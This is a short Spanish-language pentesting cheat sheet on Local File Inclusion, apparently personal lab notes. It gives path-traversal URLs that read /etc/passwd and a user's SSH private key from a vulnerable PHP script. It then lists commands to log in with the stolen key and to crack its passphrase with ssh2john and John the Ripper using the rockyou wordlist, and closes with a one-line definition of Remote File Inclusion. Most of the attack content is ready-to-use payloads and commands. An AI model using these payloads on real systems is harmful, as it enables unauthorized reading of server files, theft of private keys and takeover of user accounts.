- Tags : #recursos #lfi #rfi
Nos permite leer archivo en el servidor objetivo 
```URL
#Leer el archivo /etc/passwd
http://192.168.230.110/tools/check_if_exist.php?doc=../../../../../../../../../../../../etc/passwd

#Intentar leer la clave rsa de un usuario para acceder mediante ssh
http://192.168.230.110/tools/check_if_exist.php?doc=../../../../../../../../../../../../home/gh0st/.ssh/id_rsa

Con esta clave podemos intentas acceder por ssh

nano id-rsa #copiamos la clave en este archivo y le damos permisos

chmod 600 id-rsa

ssh -i id-rsa gh0st@ip

De tener proteccion la clave que en ocaciones pasa podemos intentar con jhon obtener el hash para crackearlo

ssh2john id-rsa >> pass.txt

john --wordlist=/usr/share/rockyou/rokyou.txt pass.txt
```

**Remote File Inclusion**

Cuando a desde un sitio  nos permite hacer peticiones a un archivo malicioso en un servidor que nos pertenece para ejecutar ese código malicioso